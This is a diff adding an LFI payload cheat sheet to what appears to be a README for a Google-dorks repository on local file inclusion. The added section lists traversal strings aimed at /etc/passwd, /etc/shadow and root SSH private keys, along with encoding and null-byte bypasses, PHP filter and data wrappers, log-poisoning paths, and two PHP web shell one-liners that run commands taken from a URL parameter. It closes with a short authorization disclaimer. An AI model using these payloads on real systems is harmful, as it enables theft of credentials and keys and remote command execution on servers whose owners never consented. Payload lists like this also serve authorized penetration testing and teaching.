@@ -48,6 +48,73 @@ Understanding LFI vulnerabilities is crucial. Exploiting an LFI can allow an att
 
 Advanced LFI involves bypassing filters, manipulating input parameters, and escalating access. Techniques include using wrapper protocols (such as data://, php://, and file://), directory traversal attacks, and exploiting different web server configurations.
 
+## Local File Inclusion (LFI) Payloads
+
+Here are various payloads useful for testing LFI vulnerabilities in web applications:
+
+1. **Basic LFI Payload:**
+
+   ```
+   ../../../../../../etc/passwd
+   ```
+
+2. **URL Encoding Payload:**
+
+   ```
+   ..%2f..%2f..%2fetc%2fpasswd
+   ```
+
+3. **Null Byte Payload:**
+
+   ```
+   ../../../../../../etc/passwd%00
+   ```
+
+4. **Wrapper Protocol Payloads:**
+
+   - `php://filter/convert.base64-encode/resource=index.php`
+   - `data://text/plain;base64,SGVsbG8gV29ybGQ=`
+
+5. **Directory Traversal Payloads:**
+
+   - Windows: `../../../windows/win.ini`
+   - Linux: `../../../etc/passwd`
+   
+6. **Shell Command Execution Payloads:**
+
+   - `<?php echo shell_exec($_GET['cmd']); ?>`
+   - `<?php system($_GET['cmd']); ?>`
+
+7. **Server Log File Payloads:**
+
+   - `/var/log/apache/access.log`
+   - `/var/log/nginx/access.log`
+
+8. **Windows File Payloads:**
+
+   - `C:\boot.ini`
+   - `C:\Windows\System32\drivers\etc\hosts`
+
+9. **PHP Configuration Payload:**
+
+   ```
+   /proc/self/environ
+   ```
+
+10. **Web Server Configuration Payloads:**
+
+    - Apache: `/etc/httpd/conf/httpd.conf`
+    - Nginx: `/etc/nginx/nginx.conf`
+
+11. **Sensitive File Payloads:**
+
+    - `../../../root/.ssh/id_rsa`
+    - `/etc/shadow`
+   
+These payloads are meant for educational and testing purposes only. Always ensure you have proper authorization and permissions before using them on systems.
+
+
+
 ## Exploring the GDorks Main Repository
 
 The [GDorks repository](https://github.com/Ishanoshada/GDorks/) is a comprehensive resource that contains an extensive collection of LFI dorks, categorized folders, and detailed documentation covering various LFI attack vectors, methods, and tools.
